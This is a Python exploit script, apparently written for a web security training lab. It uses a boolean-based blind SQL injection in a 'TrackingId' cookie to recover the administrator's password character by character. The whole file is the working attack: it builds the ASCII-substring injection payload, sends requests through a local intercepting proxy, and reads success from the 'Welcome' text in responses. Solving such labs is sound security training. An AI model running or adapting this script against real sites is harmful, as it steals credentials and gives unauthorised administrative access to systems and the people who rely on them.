import requests
import sys
from bs4 import BeautifulSoup
import urllib3
import urllib.parse
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_password(url):
    password_extracted = ""
    max_len = 20
    for i in range(1, max_len + 1):
        found = False
        for j in range(32, 127):  # printable ASCII (127 is exclusive)
            # Note: numeric comparison should not be quoted
            sql_payload = "' AND (SELECT ASCII(SUBSTRING(password, %d, 1)) FROM users WHERE username='administrator')=%d--" % (i, j)
            encoded = urllib.parse.quote(sql_payload)
            cookies = {
                'TrackingId': 'zHqLmq142EZ3hxfE' + encoded,
                'session': '62grXf2P4I5OepyHhsi3Wvg6ZaILKKOl'
            }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            # If the condition is TRUE the application usually shows the "Welcome" (adjust for target app)
            if "Welcome" in r.text:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                found = True
                break
            else:
                # optional: show progress candidate (comment out if noisy)
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
        if not found:
            # no matching char for this position -> assumed end of password
            break

    print("\n[+] Done. Password:", password_extracted)
    return password_extracted

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].rstrip('/')
    print("[+] Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
